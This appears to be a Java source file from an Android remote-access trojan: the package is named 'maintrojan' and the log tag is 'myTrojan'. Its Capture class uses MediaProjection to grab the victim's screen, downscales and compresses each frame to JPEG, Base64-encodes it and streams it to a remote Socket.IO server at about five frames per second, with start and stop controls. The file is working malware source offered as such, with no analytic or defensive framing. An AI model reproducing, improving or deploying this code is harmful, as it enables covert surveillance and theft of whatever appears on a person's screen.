package com.example.maintrojan;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.hardware.display.DisplayManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;

import io.socket.client.IO;
import io.socket.client.Socket;
public class Capture {
    private static final String TAG = "myTrojan";
    private static int width,height,dpi,IMAGES_PRODUCED;
    public static ImageReader mImageReader;
    public static ByteArrayOutputStream outputStream;
    private static boolean START = false;
    private static long lastFrameTime = 0;

    @SuppressLint("WrongConstant")
    public static void setup(Socket socket, Context ctx,MediaProjection mProjection,Handler handler,int maxImg){
        // Setup screen data
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        Point size = new Point();
        display.getRealSize(size);
        //=====[]======
        //=====[]======
        // Store Real Size for reference if needed
        int realWidth = size.x;
        int realHeight = size.y;
        
        // Scale down to 270p-ish (Extreme Stability Mode)
        int scaleFactor = 4;
        int scaledW = realWidth / scaleFactor;
        int scaledH = realHeight / scaleFactor;
        
        // ALIGNMENT: Round to nearest multiple of 16
        width = (scaledW + 15) & ~15;
        height = (scaledH + 15) & ~15;
        
        if (width <= 0) width = 160;
        if (height <= 0) height = 160;
        
        dpi = metrics.densityDpi;


        // Init Image Reader with Scaled Size
        mImageReader = ImageReader.newInstance(width,height, PixelFormat.RGBA_8888,maxImg);
        int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;

        mProjection.createVirtualDisplay("mir-src",width,height,dpi,flags,mImageReader.getSurface(),null,handler);

        mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {

            @Override
            public void onImageAvailable(ImageReader imageReader) {
                // Throttling: Limit to ~5 FPS (200ms) for stability testing
                long now = System.currentTimeMillis();
                
                if ((now - lastFrameTime) < 200) {
                     try (Image img = mImageReader.acquireLatestImage()) { 
                         if (img != null) img.close(); 
                     } catch (Exception e) {}
                     return;
                }
                lastFrameTime = now;

                FileOutputStream fos = null;
                Bitmap bitmap = null;
                outputStream = null;
                try (Image image = mImageReader.acquireLatestImage()) {
                    if(START){
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            
                            // SIMPLIFIED: Create bitmap directly with virtual display dimensions
                            // This avoids padding calculation errors that cause SurfaceFlinger crashes
                            bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                            
                            // Copy pixels directly - Android handles stride internally
                            buffer.rewind();
                            bitmap.copyPixelsFromBuffer(buffer);

                            // Compress directly (no cropping needed since we used exact dimensions)
                            outputStream = new ByteArrayOutputStream();
                            
                            // Quality 30 (Safe balance)
                            boolean success = bitmap.compress(Bitmap.CompressFormat.JPEG, 30, outputStream); 
                            
                            // Recycle immediately
                            bitmap.recycle();
                            bitmap = null;
                            
                            if (success) {
                                String encode = Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP);
    
                                // Payload Safety Check (Max 300KB)
                                if (encode.length() < 300000 && encode.length() > 0) {
                                    socket.emit("img", encode);
                                    IMAGES_PRODUCED++;
                                } else {
                                    Log.e(TAG, "Frame dropped: Invalid size (" + encode.length() + ")");
                                }
                            } else {
                                Log.e(TAG, "Compression Failed");
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    // Cleanup
                }
            }
        },handler);
    }



    public static void stop(){
        START = false;
    }
    public static void start(){
        START = true;
    }





}
